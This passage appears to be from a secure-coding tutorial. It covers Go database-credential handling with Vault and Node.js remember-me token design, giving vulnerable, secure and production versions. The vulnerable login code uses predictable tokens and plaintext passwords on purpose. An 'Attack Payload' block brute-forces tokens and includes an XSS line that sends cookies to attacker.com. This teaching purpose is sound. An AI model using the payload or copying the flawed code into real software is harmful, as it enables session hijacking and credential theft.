**Why This Is Dangerous**:
- Credentials are committed to version control history permanently
- Compiled binaries contain plaintext strings that can be extracted
- Anyone with repository access (contractors, ex-employees) can steal credentials
- Error messages and logs may expose connection strings
- Rotating credentials requires code changes and redeployment
- Secrets scanning tools flag these immediately in CI/CD

**SECURE VERSION**:

```go
package main

import (
	"context"
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"

	_ "github.com/lib/pq"
)

// Config holds database configuration from environment
type Config struct {
	DBHost     string
	DBPort     string
	DBUser     string
	DBPassword string
	DBName     string
	DBSSLMode  string
}

var db *sql.DB

// LoadConfig reads configuration from environment variables
func LoadConfig() (*Config, error) {
	config := &Config{
		DBHost:     os.Getenv("DB_HOST"),
		DBPort:     os.Getenv("DB_PORT"),
		DBUser:     os.Getenv("DB_USER"),
		DBPassword: os.Getenv("DB_PASSWORD"),
		DBName:     os.Getenv("DB_NAME"),
		DBSSLMode:  os.Getenv("DB_SSLMODE"),
	}

	// Validate required fields without logging values
	if config.DBHost == "" || config.DBPassword == "" {
		return nil, fmt.Errorf("required database configuration missing")
	}

	if config.DBSSLMode == "" {
		config.DBSSLMode = "require" // Secure default
	}

	return config, nil
}

func initDB() error {
	config, err := LoadConfig()
	if err != nil {
		return fmt.Errorf("configuration error: %w", err)
	}

	connStr := fmt.Sprintf(
		"host=%s port=%s user=%s password=%s dbname=%s sslmode=%s",
		config.DBHost, config.DBPort, config.DBUser,
		config.DBPassword, config.DBName, config.DBSSLMode,
	)

	db, err = sql.Open("postgres", connStr)
	if err != nil {
		// Log error without exposing credentials
		return fmt.Errorf("failed to open database connection")
	}

	// Verify connection with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := db.PingContext(ctx); err != nil {
		return fmt.Errorf("failed to ping database")
	}

	return nil
}

func main() {
	if err := initDB(); err != nil {
		log.Fatalf("Database initialization failed: %v", err)
	}
	defer db.Close()

	http.HandleFunc("/login", loginHandler)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
```

**Key Security Controls**:
- **Environment variables**: Credentials are injected at runtime, never in source code
- **Secure defaults**: SSL mode defaults to "require" for encrypted connections
- **No credential logging**: Error messages never include passwords or connection strings
- **Validation without exposure**: Required fields are checked but values are not logged

For production environments, you need a secrets management system that supports rotation, access control, audit logging, and dynamic credentials. HashiCorp Vault is the industry standard. Here's a production-grade implementation with automatic credential rotation.

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"sync"
	"time"

	vault "github.com/hashicorp/vault/api"
	_ "github.com/lib/pq"
)

// SecureCredentialManager handles dynamic credential retrieval and rotation
type SecureCredentialManager struct {
	vaultClient  *vault.Client
	dbSecretPath string
	credentials  *DatabaseCredentials
	mu           sync.RWMutex
	leaseDuration time.Duration
	auditLogger  *log.Logger
}

// DatabaseCredentials holds dynamically generated credentials
type DatabaseCredentials struct {
	Username  string    `json:"username"`
	Password  string    `json:"password"`
	LeaseID   string    `json:"-"`
	ExpiresAt time.Time `json:"-"`
}

// NewSecureCredentialManager creates a new credential manager with Vault integration
func NewSecureCredentialManager(ctx context.Context) (*SecureCredentialManager, error) {
	// Configure Vault client
	config := vault.DefaultConfig()
	config.Address = os.Getenv("VAULT_ADDR")
	config.Timeout = 30 * time.Second

	// Enable TLS verification in production
	if os.Getenv("ENVIRONMENT") == "production" {
		config.ConfigureTLS(&vault.TLSConfig{
			CACert:     os.Getenv("VAULT_CACERT"),
			ClientCert: os.Getenv("VAULT_CLIENT_CERT"),
			ClientKey:  os.Getenv("VAULT_CLIENT_KEY"),
			Insecure:   false,
		})
	}

	client, err := vault.NewClient(config)
	if err != nil {
		return nil, fmt.Errorf("failed to create vault client: %w", err)
	}

	// Authenticate using Kubernetes service account (production)
	// or AppRole for other environments
	if err := authenticateVault(ctx, client); err != nil {
		return nil, fmt.Errorf("vault authentication failed: %w", err)
	}

	auditLogger := log.New(os.Stdout, "[AUDIT] ", log.LstdFlags|log.LUTC)

	manager := &SecureCredentialManager{
		vaultClient:  client,
		dbSecretPath: os.Getenv("VAULT_DB_SECRET_PATH"),
		auditLogger:  auditLogger,
	}

	// Fetch initial credentials
	if err := manager.refreshCredentials(ctx); err != nil {
		return nil, fmt.Errorf("initial credential fetch failed: %w", err)
	}

	// Start background credential rotation
	go manager.credentialRotationLoop(ctx)

	return manager, nil
}

// authenticateVault handles Vault authentication based on environment
func authenticateVault(ctx context.Context, client *vault.Client) error {
	env := os.Getenv("ENVIRONMENT")

	switch env {
	case "production", "staging":
		// Kubernetes authentication
		jwt, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
		if err != nil {
			return fmt.Errorf("failed to read service account token: %w", err)
		}

		data := map[string]interface{}{
			"role": os.Getenv("VAULT_ROLE"),
			"jwt":  string(jwt),
		}

		secret, err := client.Logical().WriteWithContext(ctx, "auth/kubernetes/login", data)
		if err != nil {
			return fmt.Errorf("kubernetes auth failed: %w", err)
		}

		client.SetToken(secret.Auth.ClientToken)

	default:
		// AppRole for development (never hardcode these!)
		roleID := os.Getenv("VAULT_ROLE_ID")
		secretID := os.Getenv("VAULT_SECRET_ID")

		data := map[string]interface{}{
			"role_id":   roleID,
			"secret_id": secretID,
		}

		secret, err := client.Logical().WriteWithContext(ctx, "auth/approle/login", data)
		if err != nil {
			return fmt.Errorf("approle auth failed: %w", err)
		}

		client.SetToken(secret.Auth.ClientToken)
	}

	return nil
}

// refreshCredentials fetches new dynamic credentials from Vault
func (m *SecureCredentialManager) refreshCredentials(ctx context.Context) error {
	// Request dynamic database credentials
	secret, err := m.vaultClient.Logical().ReadWithContext(ctx, m.dbSecretPath)
	if err != nil {
		return fmt.Errorf("failed to read database credentials: %w", err)
	}

	if secret == nil || secret.Data == nil {
		return fmt.Errorf("no credentials returned from vault")
	}

	creds := &DatabaseCredentials{
		Username:  secret.Data["username"].(string),
		Password:  secret.Data["password"].(string),
		LeaseID:   secret.LeaseID,
		ExpiresAt: time.Now().Add(time.Duration(secret.LeaseDuration) * time.Second),
	}

	m.mu.Lock()
	m.credentials = creds
	m.leaseDuration = time.Duration(secret.LeaseDuration) * time.Second
	m.mu.Unlock()

	// Audit log credential fetch (never log actual credentials)
	m.auditLogger.Printf("Credentials refreshed, lease_id=%s, expires_at=%s",
		maskLeaseID(secret.LeaseID), creds.ExpiresAt.Format(time.RFC3339))

	return nil
}

// credentialRotationLoop automatically refreshes credentials before expiry
func (m *SecureCredentialManager) credentialRotationLoop(ctx context.Context) {
	for {
		m.mu.RLock()
		// Refresh at 75% of lease duration
		refreshInterval := time.Duration(float64(m.leaseDuration) * 0.75)
		m.mu.RUnlock()

		if refreshInterval < time.Minute {
			refreshInterval = time.Minute
		}

		select {
		case <-ctx.Done():
			m.auditLogger.Printf("Credential rotation loop stopped")
			return
		case <-time.After(refreshInterval):
			if err := m.refreshCredentials(ctx); err != nil {
				m.auditLogger.Printf("ERROR: Credential refresh failed: %v", err)
				// Retry with exponential backoff
				time.Sleep(30 * time.Second)
				continue
			}
		}
	}
}

// GetConnectionString returns a secure connection string
func (m *SecureCredentialManager) GetConnectionString() string {
	m.mu.RLock()
	defer m.mu.RUnlock()

	return fmt.Sprintf(
		"host=%s port=%s user=%s password=%s dbname=%s sslmode=require",
		os.Getenv("DB_HOST"),
		os.Getenv("DB_PORT"),
		m.credentials.Username,
		m.credentials.Password,
		os.Getenv("DB_NAME"),
	)
}

// maskLeaseID partially masks lease ID for audit logs
func maskLeaseID(leaseID string) string {
	if len(leaseID) <= 8 {
		return "***"
	}
	return leaseID[:4] + "..." + leaseID[len(leaseID)-4:]
}

// SecureDBPool manages database connections with automatic credential refresh
type SecureDBPool struct {
	db          *sql.DB
	credManager *SecureCredentialManager
	mu          sync.RWMutex
}

// NewSecureDBPool creates a database pool with dynamic credentials
func NewSecureDBPool(ctx context.Context, credManager *SecureCredentialManager) (*SecureDBPool, error) {
	db, err := sql.Open("postgres", credManager.GetConnectionString())
	if err != nil {
		return nil, fmt.Errorf("failed to open database: %w", err)
	}

	// Production connection pool settings
	db.SetMaxOpenConns(25)
	db.SetMaxIdleConns(5)
	db.SetConnMaxLifetime(5 * time.Minute)
	db.SetConnMaxIdleTime(1 * time.Minute)

	// Verify connection
	if err := db.PingContext(ctx); err != nil {
		db.Close()
		return nil, fmt.Errorf("database ping failed: %w", err)
	}

	return &SecureDBPool{
		db:          db,
		credManager: credManager,
	}, nil
}

// Query executes a query with automatic connection recovery
func (p *SecureDBPool) Query(ctx context.Context, query string, args ...interface{}) (*sql.Rows, error) {
	p.mu.RLock()
	db := p.db
	p.mu.RUnlock()

	rows, err := db.QueryContext(ctx, query, args...)
	if err != nil {
		// Check if error is due to credential expiry
		if isAuthError(err) {
			// Reconnect with fresh credentials
			if reconnectErr := p.reconnect(ctx); reconnectErr != nil {
				return nil, fmt.Errorf("reconnection failed: %w", reconnectErr)
			}
			// Retry query
			return p.db.QueryContext(ctx, query, args...)
		}
		return nil, err
	}

	return rows, nil
}

func isAuthError(err error) bool {
	// Check for PostgreSQL authentication failure codes
	errStr := err.Error()
	return contains(errStr, "authentication failed") ||
		contains(errStr, "password authentication failed") ||
		contains(errStr, "28P01") // PostgreSQL auth failure code
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsImpl(s, substr))
}

func containsImpl(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func (p *SecureDBPool) reconnect(ctx context.Context) error {
	p.mu.Lock()
	defer p.mu.Unlock()

	// Close existing connection
	if p.db != nil {
		p.db.Close()
	}

	// Open new connection with current credentials
	db, err := sql.Open("postgres", p.credManager.GetConnectionString())
	if err != nil {
		return err
	}

	if err := db.PingContext(ctx); err != nil {
		db.Close()
		return err
	}

	p.db = db
	return nil
}

func main() {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Initialize secure credential manager
	credManager, err := NewSecureCredentialManager(ctx)
	if err != nil {
		log.Fatalf("Failed to initialize credential manager: %v", err)
	}

	// Create secure database pool
	dbPool, err := NewSecureDBPool(ctx, credManager)
	if err != nil {
		log.Fatalf("Failed to create database pool: %v", err)
	}

	http.HandleFunc("/api/users", func(w http.ResponseWriter, r *http.Request) {
		rows, err := dbPool.Query(r.Context(), "SELECT id, username FROM users LIMIT 10")
		if err != nil {
			http.Error(w, "Database error", http.StatusInternalServerError)
			return
		}
		defer rows.Close()

		// Process results...
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
	})

	log.Printf("Server starting on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
```

**Defense in Depth Layers**:

1. **Dynamic Credentials**: Vault generates short-lived database credentials that auto-expire
```go
// Credentials are valid for minutes/hours, not forever
ExpiresAt: time.Now().Add(time.Duration(secret.LeaseDuration) * time.Second)
```

2. **Automatic Rotation**: Background goroutine refreshes credentials before expiry
```go
// Refresh at 75% of lease duration to avoid interruptions
refreshInterval := time.Duration(float64(m.leaseDuration) * 0.75)
```

3. **Kubernetes Native Auth**: Service account tokens authenticate to Vault without secrets
```go
// No secrets in environment, uses mounted service account
jwt, _ := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
```

**Additional Protections**:
- **TLS everywhere**: Vault communication and database connections require TLS
- **Audit logging**: All credential operations are logged (without exposing secrets)
- **Graceful degradation**: Connection pool handles credential rotation transparently
- **Least privilege**: Each application gets unique credentials with minimal permissions
- **Credential isolation**: Compromised credentials affect only one service, not entire infrastructure
- **Zero hardcoded secrets**: All sensitive values come from Vault or environment at runtime

Remember-me functionality is a common feature but one of the most frequently misimplemented authentication mechanisms. A flawed implementation can allow attackers to hijack user sessions permanently, even after password changes.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const mysql = require('mysql2/promise');

const app = express();
app.use(cookieParser());
app.use(express.json());

const db = mysql.createPool({ host: 'localhost', user: 'root', database: 'app' });

// VULNERABLE: Predictable remember-me token
app.post('/api/login', async (req, res) => {
  const { username, password, rememberMe } = req.body;

  const [users] = await db.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password] // Also vulnerable: plaintext password comparison
  );

  if (users.length > 0) {
    const user = users[0];

    if (rememberMe) {
      // VULNERABLE: Predictable token using user ID and timestamp
      const token = Buffer.from(`${user.id}:${Date.now()}`).toString('base64');

      // VULNERABLE: No httpOnly, no secure flag, no expiry validation
      res.cookie('remember_token', token, { maxAge: 30 * 24 * 60 * 60 * 1000 });

      // VULNERABLE: Token stored in plaintext in database
      await db.execute('UPDATE users SET remember_token = ? WHERE id = ?', [token, user.id]);
    }

    req.session.userId = user.id;
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// VULNERABLE: Token validation without additional security checks
app.get('/api/auto-login', async (req, res) => {
  const token = req.cookies.remember_token;

  if (token) {
    const [users] = await db.execute(
      'SELECT * FROM users WHERE remember_token = ?',
      [token]
    );

    if (users.length > 0) {
      req.session.userId = users[0].id;
      res.json({ success: true, user: users[0].username });
    }
  }

  res.status(401).json({ error: 'Auto-login failed' });
});
```

**Attack Payload**:
```javascript
// Attacker can predict tokens by knowing user ID
const userId = 42; // Known or guessed user ID
const timestamp = Date.now(); // Approximate timestamp

// Generate possible tokens around the login time
for (let offset = -60000; offset <= 60000; offset += 1000) {
  const token = Buffer.from(`${userId}:${timestamp + offset}`).toString('base64');
  // Try each token against /api/auto-login
}

// Or if token is stolen via XSS (no httpOnly flag):
// <script>fetch('https://attacker.com/steal?token='+document.cookie)</script>
```

**Why This Is Dangerous**:
- Predictable tokens: Base64 encoding of user_id:timestamp is trivially guessable
- No token hashing: Database compromise exposes all remember-me tokens directly
- Missing cookie security flags: Allows XSS-based token theft and MITM attacks
- No token rotation: Same token valid forever until manually cleared
- No device binding: Token works from any device/IP
- Survives password change: User can't invalidate stolen tokens

**SECURE VERSION**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const bcrypt = require('bcrypt');
const mysql = require('mysql2/promise');

const app = express();
app.use(cookieParser());
app.use(express.json());

const db = mysql.createPool({ host: 'localhost', user: 'root', database: 'app' });

// Secure token generation
function generateSecureToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Hash token for storage (one-way)
function hashToken(token) {
  return crypto.createHash('sha256').update(token).digest('hex');
}

app.post('/api/login', async (req, res) => {
  const { username, password, rememberMe } = req.body;

  const [users] = await db.execute(
    'SELECT * FROM users WHERE username = ?',
    [username]
  );

  if (users.length > 0) {
    const user = users[0];
    const passwordValid = await bcrypt.compare(password, user.password_hash);

    if (passwordValid) {
      if (rememberMe) {
        // SECURE: Cryptographically random token
        const selector = generateSecureToken(); // Public identifier
        const validator = generateSecureToken(); // Secret component
        const validatorHash = hashToken(validator);

        const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000);

        // Store hashed validator with selector and expiry
        await db.execute(
          `INSERT INTO remember_tokens (user_id, selector, validator_hash, expires_at, created_at, user_agent, ip_address)
           VALUES (?, ?, ?, ?, NOW(), ?, ?)`,
          [user.id, selector, validatorHash, expiresAt, req.get('User-Agent'), req.ip]
        );

        // SECURE: Send selector:validator, store only hash
        const cookieValue = `${selector}:${validator}`;

        res.cookie('remember_token', cookieValue, {
          maxAge: 30 * 24 * 60 * 60 * 1000,
          httpOnly: true,     // Prevents XSS token theft
          secure: true,       // HTTPS only
          sameSite: 'strict', // CSRF protection
          path: '/api'        // Limit cookie scope
        });
      }

      req.session.userId = user.id;
      req.session.regenerate(() => {
        res.json({ success: true });
      });
    } else {
      res.status(401).json({ error: 'Invalid credentials' });
    }
  } else {
    // Timing-safe: always hash even for non-existent users
    await bcrypt.hash('dummy', 10);
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/api/auto-login', async (req, res) => {
  const token = req.cookies.remember_token;

  if (!token || !token.includes(':')) {
    return res.status(401).json({ error: 'No valid token' });
  }

  const [selector, validator] = token.split(':');
  const validatorHash = hashToken(validator);

  const [tokens] = await db.execute(
    `SELECT rt.*, u.username FROM remember_tokens rt
     JOIN users u ON rt.user_id = u.id
     WHERE rt.selector = ? AND rt.expires_at > NOW()`,
    [selector]
  );

  if (tokens.length > 0) {
    const storedToken = tokens[0];

    // SECURE: Constant-time comparison prevents timing attacks
    if (crypto.timingSafeEqual(
      Buffer.from(validatorHash),
      Buffer.from(storedToken.validator_hash)
    )) {
      // Rotate token on use (prevents replay)
      const newValidator = generateSecureToken();
      const newValidatorHash = hashToken(newValidator);

      await db.execute(
        'UPDATE remember_tokens SET validator_hash = ?, last_used = NOW() WHERE selector = ?',
        [newValidatorHash, selector]
      );

      res.cookie('remember_token', `${selector}:${newValidator}`, {
        maxAge: 30 * 24 * 60 * 60 * 1000,
        httpOnly: true,
        secure: true,
        sameSite: 'strict',
        path: '/api'
      });

      req.session.userId = storedToken.user_id;
      req.session.regenerate(() => {
        res.json({ success: true, user: storedToken.username });
      });
      return;
    }
  }

  // Clear invalid token
  res.clearCookie('remember_token', { path: '/api' });
  res.status(401).json({ error: 'Auto-login failed' });
});
```

**Key Security Controls**:
- **Cryptographically random tokens**: Uses `crypto.randomBytes()` instead of predictable values
- **Selector:Validator pattern**: Selector is public lookup key, validator is secret that's hashed before storage
- **Token hashing**: Only SHA-256 hash stored in database; database breach doesn't expose usable tokens
- **Secure cookie flags**: httpOnly prevents XSS theft, secure requires HTTPS, sameSite prevents CSRF
- **Token rotation**: New validator issued on each use, invalidating stolen tokens after one use
- **Constant-time comparison**: Prevents timing attacks on token validation

Excellent question! Token revocation is critical for security incident response and user account control. A proper implementation must handle password changes, explicit logout, suspicious activity detection, and allow users to manage their trusted devices.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const bcrypt = require('bcrypt');
const mysql = require('mysql2/promise');
const rateLimit = require('express-rate-limit');
const winston = require('winston');

const app = express();
app.use(cookieParser());
app.use(express.json());

// Production logging
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'security-audit.log' })
  ]
});

const db = mysql.createPool({ host: 'localhost', user: 'root', database: 'app' });

// Rate limiting for auto-login attempts
const autoLoginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // 10 attempts per window
  message: { error: 'Too many auto-login attempts' },
  standardHeaders: true
});

// Token service with full lifecycle management
class RememberMeService {
  static generateSecureToken() {
    return crypto.randomBytes(32).toString('hex');
  }

  static hashToken(token) {
    return crypto.createHash('sha256').update(token).digest('hex');
  }

  static async createToken(userId, req) {
    const selector = this.generateSecureToken();
    const validator = this.generateSecureToken();
    const validatorHash = this.hashToken(validator);
    const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000);

    // Generate unique device fingerprint
    const deviceFingerprint = crypto.createHash('sha256')
      .update(`${req.get('User-Agent')}:${req.ip}`)
      .digest('hex').substring(0, 16);

    await db.execute(
      `INSERT INTO remember_tokens 
       (user_id, selector, validator_hash, expires_at, created_at, 
        user_agent, ip_address, device_fingerprint, is_active)
       VALUES (?, ?, ?, ?, NOW(), ?, ?, ?, true)`,
      [userId, selector, validatorHash, expiresAt, 
       req.get('User-Agent')?.substring(0, 255), req.ip, deviceFingerprint]
    );

    logger.info('remember_token_created', {
      userId,
      selector: selector.substring(0, 8) + '...',
      ip: req.ip,
      deviceFingerprint,
      expiresAt
    });

    return { selector, validator, deviceFingerprint };
  }

  // Revoke single token (current device logout)
  static async revokeToken(selector) {
    const result = await db.execute(
      'UPDATE remember_tokens SET is_active = false, revoked_at = NOW() WHERE selector = ?',
      [selector]
    );

    logger.info('remember_token_revoked', {
      selector: selector.substring(0, 8) + '...',
      reason: 'user_logout'
    });

    return result[0].affectedRows > 0;
  }

  // Revoke all tokens for user (logout everywhere)
  static async revokeAllUserTokens(userId, reason = 'user_request') {
    const [result] = await db.execute(
      'UPDATE remember_tokens SET is_active = false, revoked_at = NOW() WHERE user_id = ? AND is_active = true',
      [userId]
    );

    logger.warn('all_tokens_revoked', {
      userId,
      tokensRevoked: result.affectedRows,
      reason
    });

    return result.affectedRows;
  }

  // Revoke all tokens except current (password change)
  static async revokeOtherTokens(userId, currentSelector) {
    const [result] = await db.execute(
      `UPDATE remember_tokens SET is_active = false, revoked_at = NOW() 
       WHERE user_id = ? AND selector != ? AND is_active = true`,
      [userId, currentSelector]
    );

    logger.info('other_tokens_revoked', {
      userId,
      tokensRevoked: result.affectedRows,
      reason: 'password_change'
    });

    return result.affectedRows;
  }

  // Get all active sessions for user
  static async getUserSessions(userId) {
    const [sessions] = await db.execute(
      `SELECT selector, user_agent, ip_address, created_at, last_used, device_fingerprint
       FROM remember_tokens 
       WHERE user_id = ? AND is_active = true AND expires_at > NOW()
       ORDER BY last_used DESC`,
      [userId]
    );

    return sessions.map(s => ({
      id: s.selector.substring(0, 8),
      userAgent: s.user_agent,
      ipAddress: s.ip_address,
      createdAt: s.created_at,
      lastUsed: s.last_used,
      deviceFingerprint: s.device_fingerprint
    }));
  }

  // Validate and use token with anomaly detection
  static async validateToken(cookieValue, req) {
    if (!cookieValue || !cookieValue.includes(':')) {
      return { valid: false, reason: 'invalid_format' };
    }

    const [selector, validator] = cookieValue.split(':');

    if (!selector || !validator || selector.length !== 64 || validator.length !== 64) {
      return { valid: false, reason: 'invalid_token_length' };
    }

    const validatorHash = this.hashToken(validator);

    const [tokens] = await db.execute(
      `SELECT rt.*, u.username, u.security_version FROM remember_tokens rt
       JOIN users u ON rt.user_id = u.id
       WHERE rt.selector = ? AND rt.is_active = true AND rt.expires_at > NOW()`,
      [selector]
    );

    if (tokens.length === 0) {
      logger.warn('remember_token_not_found', {
        selector: selector.substring(0, 8) + '...',
        ip: req.ip
      });
      return { valid: false, reason: 'token_not_found' };
    }

    const storedToken = tokens[0];

    // Constant-time comparison
    let isValid;
    try {
      isValid = crypto.timingSafeEqual(
        Buffer.from(validatorHash),
        Buffer.from(storedToken.validator_hash)
      );
    } catch {
      return { valid: false, reason: 'comparison_error' };
    }

    if (!isValid) {
      // Possible token theft - revoke all tokens for this user
      logger.error('remember_token_theft_detected', {
        userId: storedToken.user_id,
        selector: selector.substring(0, 8) + '...',
        ip: req.ip,
        storedIp: storedToken.ip_address
      });

      await this.revokeAllUserTokens(storedToken.user_id, 'potential_theft');
      return { valid: false, reason: 'token_theft_detected' };
    }

    // Anomaly detection: check for suspicious location/device changes
    const currentFingerprint = crypto.createHash('sha256')
      .update(`${req.get('User-Agent')}:${req.ip}`)
      .digest('hex').substring(0, 16);

    const isAnomalous = storedToken.device_fingerprint !== currentFingerprint;

    if (isAnomalous) {
      logger.warn('remember_token_anomaly', {
        userId: storedToken.user_id,
        storedFingerprint: storedToken.device_fingerprint,
        currentFingerprint,
        storedIp: storedToken.ip_address,
        currentIp: req.ip
      });

      // Require re-authentication for suspicious access
      return { valid: false, reason: 'device_mismatch', requiresReauth: true };
    }

    // Rotate token
    const newValidator = this.generateSecureToken();
    const newValidatorHash = this.hashToken(newValidator);

    await db.execute(
      'UPDATE remember_tokens SET validator_hash = ?, last_used = NOW() WHERE selector = ?',
      [newValidatorHash, selector]
    );

    return {
      valid: true,
      userId: storedToken.user_id,
      username: storedToken.username,
      selector,
      newValidator
    };
  }

  // Cleanup expired tokens (run as cron job)
  static async cleanupExpiredTokens() {
    const [result] = await db.execute(
      'DELETE FROM remember_tokens WHERE expires_at < NOW() OR (is_active = false AND revoked_at < DATE_SUB(NOW(), INTERVAL 30 DAY))'
    );

    logger.info('tokens_cleanup', { deleted: result.affectedRows });
    return result.affectedRows;
  }
}

